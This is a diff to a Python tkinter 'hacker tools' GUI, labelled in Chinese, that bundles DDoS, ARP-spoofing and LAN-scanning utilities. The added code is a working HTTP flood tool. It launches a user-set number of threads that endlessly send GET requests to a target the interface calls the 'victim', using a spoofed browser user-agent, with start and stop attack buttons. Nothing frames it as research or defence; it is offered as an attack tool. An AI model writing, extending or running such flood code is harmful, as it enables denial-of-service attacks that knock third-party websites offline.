@@ -10,8 +10,7 @@ from tkinter.filedialog import asksaveasfilename
 from scapy.all import *
 import subprocess
 import re
-import platform
-
+import requests
 from scapy.layers.l2 import ARP, Ether
 
 lock = threading.Lock()
@@ -28,6 +27,7 @@ arp_open = False
 findip_ok = False
 arp_ip_list = []
 arp_many_ip = False
+ddos_thread_open = False
 
 def error(string,parent):
     messagebox.showerror(title="错误",message=string,parent=parent)
@@ -56,15 +56,15 @@ except socket.error:
 
 # 创建主窗口
 root_main = tk.Tk()
-root_main.title("LakeV0.25 :)")
+root_main.title("LakeV0.3ProMax")
 root_main.geometry("300x200")
 
 # ddos窗口
-def open_ddos_window():
+def open_socket_ddos_window():
     global ddos_size_1_random
     root_ddos = tk.Toplevel(root_main)
     root_ddos.geometry("760x400")
-    root_ddos.title("ddos V2.5")
+    root_ddos.title("socket_ddos V2.5")
     def portscanner(host, port):
         global openNum,open_port
         try:
@@ -594,9 +594,53 @@ def open_findip_window():
     tk.Button(root_findip,text="导出IP地址",command=save_ipfile).place(x=0,y=0)
     tk.Label(root_findip,text="最好进行多次扫描之后再导出ip").place(x=170,y=30)
     root_findip.mainloop()
-tk.Label(root_main,text="Lake Hacker Tools 给你一个黑客的世界").place(x=0,y=0)
-tk.Button(root_main,text="ddos",command=open_ddos_window).place(x=0,y=30)
-tk.Button(root_main,text="arp欺骗",command=open_arp_window).place(x=0,y=60)
+def open_requests_ddos_window():
+    root_requests_ddos = tk.Toplevel(root_main)
+    root_requests_ddos.title("requests_ddosV0.1")
+    root_requests_ddos.geometry("300x200")
+
+    def ddos(num):
+        while True:
+            if ddos_thread_open:
+                response = requests.get(ddos_victimIP.get(), headers={'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36'})
+                print(f"第 {num} 线程 状态码:", response.status_code)
+            else:
+                return
+    def start_ddos():
+        global ddos_thread_open
+        def start():
+            for i in range(int(ddos_thread.get())):
+                threading.Thread(target=ddos,args=(i+1,)).start()
+        if ddos_victimIP.get()!="":
+            if fint(ddos_thread.get()):
+                ddos_thread_open = True
+                threading.Thread(target=start).start()
+            else:
+                error("请输入整数线程",root_requests_ddos)
+        else:
+            error("请输入受害者IP",root_requests_ddos)
+    def close_ddos():
+        global ddos_thread_open
+        ddos_thread_open = False
+        showinfo("已停止攻击",parent=root_requests_ddos)
+
+    ddos_victimIP = tk.StringVar()
+    ddos_thread = tk.StringVar()
+    ddos_thread.set("1")
+
+    tk.Label(root_requests_ddos,text="请在网站前加上https://或http://").place(x=0,y=0)
+    tk.Label(root_requests_ddos,text="受害者IP：").place(x=0,y=30)
+    tk.Entry(root_requests_ddos,textvariable=ddos_victimIP).place(x=70,y=30)
+    tk.Label(root_requests_ddos,text="线程：").place(x=0,y=60)
+    tk.Entry(root_requests_ddos,textvariable=ddos_thread).place(x=70,y=60)
+    tk.Button(root_requests_ddos,text="开始攻击",command=start_ddos).place(x=40,y=90)
+    tk.Button(root_requests_ddos,text="停止攻击",command=close_ddos).place(x=120,y=90)
+
+    root_requests_ddos.mainloop()
+tk.Label(root_main,text="Lake Hacker Tools").place(x=0,y=0)
+tk.Button(root_main,text="socket_ddos",command=open_socket_ddos_window).place(x=0,y=30)
+tk.Button(root_main,text="requests_ddos",command=open_requests_ddos_window).place(x=0,y=60)
+tk.Button(root_main,text="arp欺骗",command=open_arp_window).place(x=0,y=90)
 tk.Button(root_main,text="查看同局域网的活主机",command=open_findip_window).place(x=165,y=30)
 tk.Label(root_main,text=f"你的IP：{ip}").place(x=0,y=180)
 
